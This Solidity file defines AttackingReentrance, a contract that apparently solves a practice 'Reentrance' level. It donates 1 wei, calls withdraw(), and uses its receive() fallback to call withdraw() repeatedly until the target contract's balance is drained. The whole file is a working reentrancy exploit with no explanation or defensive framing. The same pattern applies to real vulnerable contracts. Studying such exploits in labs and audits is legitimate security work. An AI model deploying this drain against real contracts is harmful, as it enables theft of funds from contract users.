// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public reentrance;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentrance = Reentrance(_contractAddress);
    }

    function hackContract() external {
        reentrance.donate{value: 1}(address(this));
        reentrance.withdraw();
    }

    receive() external payable {
        if (contractAddress.balance > 0) {
            reentrance.withdraw();
        }
    }

}
